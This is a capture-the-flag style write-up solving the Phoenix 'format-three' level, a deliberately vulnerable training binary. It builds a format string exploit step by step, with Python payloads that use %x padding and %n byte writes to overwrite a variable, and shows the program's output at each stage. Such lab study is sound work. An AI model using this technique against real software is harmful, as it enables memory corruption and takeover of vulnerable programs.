The goal of this level is to somehow write 0x64457845 into the variable changeme. This means that &changeme should contain 0x45, &changeme+1 should contain 0x78, and so on.

```sh
gef➤  print &changeme
$1 = (<data variable, no debug info> *) 0x8049844 <changeme>
```

```sh
user@phoenix-amd64:~$ python -c 'print("AAAABBBB" + " %x "*14)' | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAABBBB 0  0  0  f7f81cf7  f7ffb000  ffffd608  8048556  ffffc600  ffffc600  fff  0  41414141  42424242  20782520
Better luck next time - got 0x00000000, wanted 0x64457845!
```

We see that the 12th argument matches up with the first 4 bytes of the buffer. Therefore, by using %n as the 12th conversion specifer, we can write to the address that those 4 bytes form. So if we write the address of changeme into the start of the buffer instead of AAAA, the number of characters printed before %n gets written into the address of changeme. The only problem is that 0x64457845=1682274373 is a lot of characters to print. But we can use a trick: by using three more %n, we can write smaller numbers into each of the 4 bytes that form the address of changeme.

When the Python script below is used as input to format-three, four pointers pointing to each individual byte of the integer changeme are written to the start of the buffer, and the number of characters before %n is written into the first byte.

```python
buff = ""
buff += "\x44\x98\x04\x08"
buff += "\x45\x98\x04\x08"
buff += "\x46\x98\x04\x08"
buff += "\x47\x98\x04\x08"

buff += "%x "*11

buff += "%n"

print(buff)
```

```sh
user@phoenix-amd64:~$ python exploit.py | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd608 8048556 ffffc600 ffffc600 fff 0
Better luck next time - got 0x00000051, wanted 0x64457845!
```

We see that 0x51 got written into changeme. Since all we can do is write more characters, and we want the first byte to read 0x45, we could write 0x145. This means that 0x01 will get written into the second byte (at 0x8049845), that is fine, since we will overwrite it later.

Below is our updated Python script. We have added a buch of A's to the output, the exact amount to make the total amount of printed characters equal 0x145.

```python
buff = ""
buff += "\x44\x98\x04\x08"
buff += "\x45\x98\x04\x08"
buff += "\x46\x98\x04\x08"
buff += "\x47\x98\x04\x08"

buff += "%x "*11

buff += "A"*int(0x145-0x51)
buff += "%n"

print(buff)
```

Now we need to fill in the second byte of changeme. Since we're already at 0x145 characters, and 0x78 is less than that, we need to write 0x178 instead. Like in the previous step, we add a bunch of A's to cover the difference and finish of with a %n. This second %n will make printf write to the second pointer we place in the buffer.

```python
buff = ""
buff += "\x44\x98\x04\x08"
buff += "\x45\x98\x04\x08"
buff += "\x46\x98\x04\x08"
buff += "\x47\x98\x04\x08"

buff += "%x "*11

buff += "A"*int(0x145-0x51)
buff += "%n"

buff += "A"*int(0x178-0x145)
buff += "%n"

print(buff)
```

```sh
user@phoenix-amd64:~$ python exploit.py | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd608 8048556 ffffc600 ffffc600 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00017845, wanted 0x64457845!
```

To complete this level, we just have to do exactly the same for the two remaining bytes. The final Python script is:

```python
buff = ""
buff += "\x44\x98\x04\x08"
buff += "\x45\x98\x04\x08"
buff += "\x46\x98\x04\x08"
buff += "\x47\x98\x04\x08"

buff += "%x "*11

buff += "A"*int(0x145-0x51)
buff += "%n"

buff += "A"*int(0x178-0x145)
buff += "%n"

buff += "A"*int(0x245-0x178)
buff += "%n"

buff += "A"*int(0x264-0x245)
buff += "%n"

print(buff)
```

```sh
user@phoenix-amd64:~$ python exploit.py | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd608 8048556 ffffc600 ffffc600 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```
